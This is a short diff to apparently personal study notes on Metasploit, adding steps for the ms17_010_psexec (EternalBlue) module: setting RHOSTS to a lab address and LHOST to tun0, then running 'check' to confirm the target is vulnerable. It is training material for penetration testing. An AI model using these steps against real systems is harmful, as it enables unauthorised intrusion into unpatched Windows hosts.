@@ -159,6 +159,18 @@ Let us take a basic example of searching for an exploit for an application we ar
 - > use exploit/windows/smb/ms17_010_psexec
 - > show options
 
+"""Any option with Required set to yes needs to be set for the exploit to work. In this case, we only have two options to set: RHOSTS, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the set command:
+
+-  > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.40
+-  > set LHOST tun0
+LHOST => tun0
+"""
+
+"""Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:
+
+- > check"""
+
 
 
 # links
